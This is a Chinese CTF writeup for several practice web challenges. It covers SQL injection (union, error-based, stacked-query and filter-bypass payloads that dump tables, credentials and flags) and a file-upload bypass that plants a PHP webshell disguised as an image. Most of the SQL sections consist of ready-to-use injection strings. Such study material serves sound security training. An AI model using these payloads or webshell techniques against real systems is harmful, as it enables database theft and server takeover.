---
title: 文件上传与SQL注入 Writeup
date: 2026-06-13 00:00:00
categories:
  - WP
tags:
  - SQL注入
  - 文件上传
---
## sql注入

### 极客大挑战2019EasySQL

方法一，用万能公式

![image-20260522153705835](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522153705835.png)

![image-20260522153737015](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522153737015.png)

方法二，查看回显位，若有回显则找数据库(或者跳过这一步，直接去下面那条database（）找表，updatexml和'~'可以换的，具体看题过滤了那些字符)

![image-20260522153852644](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522153852644.png)

发现一直是这个页面，尝试报错注入。

' or updatexml(1,concat('~',(select database())),3)#                 //爆出数据库

![image-20260522154137499](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522154137499.png)

' or updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),3)#                                              //爆出数据库中的表

![image-20260522154328599](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522154328599.png)

' or updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='geekuser')),3)#                       //爆出表中的列元素

![image-20260522154505495](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522154505495.png)

' or updatexml(1,concat('~',(select substr(group_concat(username,'@',password limit 0,1),1,32) from geekuser)),3)#

![image-20260522155524696](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522155524696.png)

' or updatexml(1,concat('~',(select substr(group_concat(username,'@',password limit 0,1),32,32) from geekuser)),3)#

![image-20260522155741856](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522155741856.png)

报错注入中的updatexml一次只能查看32个字节的数据，所以分两部分查看username和password ，并且得用limit去限制在第一个行username和password里面

最后得出来一个username：in_fact 和 password：This_question_is_very_simple。然后用这个登陆获得flag。

![image-20260522155951350](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522155951350.png)

![image-20260522155944690](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522155944690.png)



### 极客大挑战2019LoveSQL

先查看回显位，' union select 1,2,3#，发现2，3都是回显位，然后用union联合注入

![image-20260522161945034](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522161945034.png)

爆数据库

' union select 1,(select database()),3#

![image-20260522162113717](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522162113717.png)

爆表

' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3#

![image-20260522162246865](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522162246865.png)

爆列

' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'),3#

爆数据

' union select 1,2,(select group_concat(password) from l0ve1ysq1)#

![image-20260522162923594](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522162923594.png)



### 极客大挑战2019BabySQL

找到注入点

![image-20260611185432435](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260611185432435.png)

![image-20260611185417745](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260611185417745.png)

然后爆字段数

/check.php?username=admin&password=2&#39; order by 3--+

![image-20260611185531296](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260611185531296.png)

发现or和by被过滤，都双写绕过

![image-20260611185523181](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260611185523181.png)

/check.php?username=admin&password=2' oorrder bbyy 3#                   //可以看出字段数是三

![image-20260611185805083](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260611185805083.png)

然后查看回显位

/check.php?username=admin&password=2' union select 1,2,3#

![image-20260611190032683](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260611190032683.png)

发现union和select被过滤，用同样的方法绕过，发现回显位

/check.php?username=admin&password=2' ununionion seleselectct 1,2,3#

![image-20260611190013622](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260611190013622.png)

爆表名（这里的from和where被过滤）

1' uniunionon selselectect 1,2,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='geek')#

![image-20260611191255552](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260611191255552.png)

爆列名

1' uniunionon selselectect 1,2,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='b4bsql')#

![image-20260611191346436](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260611191346436.png)

爆数据

1' uniunionon selselectect 1,2,(selselectect group_concat(username,passwoorrd) frfromom b4bsql)#

![image-20260611191622779](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260611191622779.png)



### 强网杯随便注

![image-20260522163903360](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522163903360.png)

![image-20260522163919841](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522163919841.png)

可以看出闭合方式是1',接着查询列数

![image-20260522164050902](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522164050902.png)

![image-20260522164124129](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522164124129.png)

发现有两列，然后用联合注入，发现select被过滤

1'; show tables;#                //获得两个表名

![image-20260522164828141](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522164828141.png)

1'; show columns from `1919810931114514`;#           //获得列名

![image-20260522165925665](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522165925665.png)

可以看到`flag`在`1919810931114514`表中的第一列，1'; handler `1919810931114514` open; handler `1919810931114514` read first; --+                                                                             //查看第一列获得flag

![image-20260610102314350](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260610102314350.png)

**handler是 MySQL/MariaDB 中能够直接读取表数据的语句，无需使用 SELECT。**



### GXYCTF2019BabySQli

回显sql报错，是一个注入点

![image-20260527115837103](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260527115837103.png)

![image-20260527115817150](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260527115817150.png)

然后爆字段数

![image-20260522190416189](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522190416189.png)



![image-20260522190427391](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522190427391.png)

![image-20260522191102269](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522191102269.png)

然后可以看出字段数是3，然后用union联合注入尝试回显。

1' union select 1,2,3#发现源码中有一串代码，然后去解码

![image-20260522191253358](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522191253358.png)

解出来select * from where usrname = '$name',说明数据在名字为用户名为name的里面

![image-20260522191456169](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260522191456169.png)

上面也知道一共有三列，然后用union select来创建一个临时账号

1' union select 1,'admin','123'#

![image-20260527120036181](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260527120036181.png)

![image-20260527212012931](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260527212012931.png)



发现还是没有成功，说明被加密了

然后查看它的源码第46行，得出密码被md5加密，加密后的密码与我们自己创建密码的一样，获得flag，所以创建临时账号的时候，给最后一个密码加密一下就行，也就是给1md5加密

![image-20260527115307670](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260527115307670.png)

1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#

![image-20260527212042898](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260527212042898.png)

![image-20260527212140772](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260527212140772.png)

获得flag

![image-20260527212227567](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260527212227567.png)



### 极客大挑战2019Hardsql

尝试用万能密码，发现不可以

?username=1' or 1=1#&password=1

![image-20260526233051389](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260526233051389.png)

而且输入什么都是这个页面，尝试报错注入。这里面的空格和and被过滤，and用^替代

爆出库名

/check.php?username=1'^extractvalue(1,(concat('~',(select(database())))))#&password=1

![image-20260526233538643](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260526233538643.png)

报表名

/check.php?username=1'^extractvalue(1,(concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')))))#&password=1

![image-20260526235117745](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260526235117745.png)

爆出列名

/check.php?username=1'^extractvalue(1,(concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')))))#c

![image-20260526235409542](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260526235409542.png)

爆出数据

/check.php?username=1'^extractvalue(1,(concat('~',(select(group_concat(username,password))from(H4rDsq1)))))#&password=1

![image-20260526235525465](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260526235525465.png)

发现flag在password这个里面，但是只能查看部分flag，用substr去分部分查看，发现substr也被过滤，用right函数。

1'^extractvalue(1,(concat('~',(select(right(password,25))from(H4rDsq1)))))#

![image-20260527000055210](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260527000055210.png)

然后与第一部分相加，重复部分删去，得到最终flag

flag{f6c13795-7688-4bbb-acbd-719c2de3d13b}

**`RIGHT()` 函数的作用是：从一个字符串的末尾（右侧）提取指定数量的字符。**

**-- 提取最后 3 个字符**
**SELECT RIGHT('Hello World', 3);  -- 结果：'rld'**

**-- 从列中提取数据**
**SELECT RIGHT(phone_number, 4) FROM customers;  -- 提取电话号码最后4位**

**-- 结合 WHERE 条件使用**
**SELECT * FROM users** 
**WHERE RIGHT(email, 4) = '.com';  -- 查找邮箱以 .com 结尾的用户**



### [SWPUCTF 2021 新生赛]sql

在源码里面找到参数

![image-20260529175815477](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260529175815477.png)

通过报错找到闭合方式和注入点

![image-20260529175549257](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260529175549257.png)

发现#号被过滤，用URL编码%23代替

![image-20260529175709929](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260529175709929.png)

然后查看列数

![image-20260529180400957](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260529180400957.png)

发现空格也没过滤了，用/**/来代替

![image-20260529180538679](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260529180538679.png)

发现有回显，接着报库名，列名和最终的数据

此时发现=也被过滤了，那就用like来代替

![image-20260529180759290](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260529180759290.png)

爆出库名

![image-20260529180910331](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260529180910331.png)

爆出列名

![image-20260529181026883](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260529181026883.png)

爆出最终的flag，发现只有一半，然后用substr()和right()这两个函数，发现都被过滤，所以尝试用mid函数

?wllm=-1%27/**/union/**/select/**/1,2,(select/**/mid(group_concat(flag),1,20)from(LTLT_flag))%23

![image-20260529181815811](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260529181815811.png)

?wllm=-1%27/**/union/**/select/**/1,2,(select/**/mid(group_concat(flag),21,20)from(LTLT_flag))%23

![image-20260529181844556](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260529181844556.png)

?wllm=-1%27/**/union/**/select/**/1,2,(select/**/mid(group_concat(flag),41,20)from(LTLT_flag))%23

![image-20260529181912754](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260529181912754.png)

**mid截取，通过第一次得到的flag长度发现因为回显只能有20个**



## 文件上传

### ACTF2020新生赛Upload

先尝试上传一个txt文件发现只能上传jpg、png、gif结尾的图片

![image-20260521184047099](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521184047099.png)

然后随便上传一个图片，会发现上传成功

![image-20260521190308204](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521190308204.png)

然后猜测可能是文件头绕过

gif的文件头为**GIF89**，上传一个图片马12.jpg，然后抓包修改

![image-20260521190847694](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521190847694.png)



![image-20260521191254598](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521191254598.png)将.jpg修改成.phtml，骗过服务端检查，然后把修改后的数据包发送，发现成功上传并且获得上传文件路径

![image-20260521191353131](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521191353131.png)

最后用蚁剑连接，发现其根目录下有flag。

![image-20260521191418315](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521191418315.png)

![image-20260521191439651](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521191439651.png)

![image-20260521191449208](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521191449208.png)

最后一句话总结：**这是“图片马 + 抓包改包绕过”的组合拳：用图片头骗过文件类型检测，用改包改后缀骗过后缀名检测，最终上传可执行的 webshell。**

#### 
